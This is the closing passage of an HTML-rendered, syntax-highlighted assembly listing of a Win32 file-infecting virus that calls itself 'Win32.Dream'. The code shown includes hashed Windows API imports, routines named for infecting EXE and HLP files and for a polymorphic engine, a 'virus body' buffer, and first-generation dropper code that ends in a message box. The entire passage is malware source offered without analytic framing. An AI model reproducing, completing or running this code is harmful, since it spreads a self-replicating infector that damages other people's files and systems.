    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">033D350C4h</span><span class="sc0">   </span><span class="sc1">;OpenProcess</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0D4540229h</span><span class="sc0">   </span><span class="sc1">;WaitForSingleObject</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">05F31BC8Eh</span><span class="sc0">   </span><span class="sc1">;RegisterServiceProcess</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0EF7D811Bh</span><span class="sc0">   </span><span class="sc1">;GetFileSize</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">083A353C3h</span><span class="sc0">   </span><span class="sc1">;GlobalAlloc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">05CDF6B6Ah</span><span class="sc0">   </span><span class="sc1">;GlobalFree</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">054D8615Ah</span><span class="sc0">   </span><span class="sc1">;ReadFile</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">085859D42h</span><span class="sc0">   </span><span class="sc1">;SetFilePointer</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0A2EB817Bh</span><span class="sc0">   </span><span class="sc1">;SetErrorMode</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0EB1CE85Ch</span><span class="sc0">   </span><span class="sc1">;GetCurrentProcessId</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">042F13D06h</span><span class="sc0">   </span><span class="sc1">;GetVersion</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0613FD7BAh</span><span class="sc0">   </span><span class="sc1">;GetTickCount</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">041D64912h</span><span class="sc0">   </span><span class="sc1">;OpenFileMappingA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0797B49ECh</span><span class="sc0">   </span><span class="sc1">;MapViewOfFile (other address)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">019F33607h</span><span class="sc0">   </span><span class="sc1">;CreateThread</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00AC136BAh</span><span class="sc0">   </span><span class="sc1">;Sleep</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">process_maps</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">check_infected</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">create_infected</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">infect_hlp</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">infect_exe</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">poly_engine</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">checksum</span><span class="sc0">
</span><span class="sc5">p_number</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">process_maps</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc4">+</span><span class="sc2">95</span><span class="sc0">

</span><span class="sc5">process_memory</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">thandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;returned thread handle by dropper</span><span class="sc0">
    </span><span class="sc5">th_mempos</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;thread body memory position</span><span class="sc0">
    </span><span class="sc5">process</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">p_number</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;hProcess (Wait), ProcessID (Open)</span><span class="sc0">
    </span><span class="sc5">apiz</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">count</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;all API functionz without two last</span><span class="sc0">
    </span><span class="sc5">active</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">p_number</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;active process (=function) ?</span><span class="sc0">
    </span><span class="sc5">paramz</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;process parameters</span><span class="sc0">
    </span><span class="sc5">vbody</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">vsize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;virus body (poly, valuez)</span><span class="sc0">
</span><span class="sc1">;   filename   dd  260 dup (0)    ;name of file (opening, etc)</span><span class="sc0">
    </span><span class="sc5">ci_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc4">*(</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;check_infected fpu buffer</span><span class="sc0">
</span><span class="sc1">;   cinfected  db  ci_size dup(0)</span><span class="sc0">
</span><span class="sc1">;   poly_vbody equ this byte</span><span class="sc0">
</span><span class="sc1">; ** This is Tasm32 bug, cannot asm through const-&gt;proc + dup</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

    </span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">file_end</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">mem_end</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">401000h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc0">
    </span><span class="sc5">fgx</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"E:\X_WIN\ABCD.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fg0</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fgx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fg1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Win32.Dream - welcome to my world..."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fg1</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fg2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"First generation sample"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fg2</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ end of virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">mem_end</span><span class="sc0">
</span></div></body>
</html>
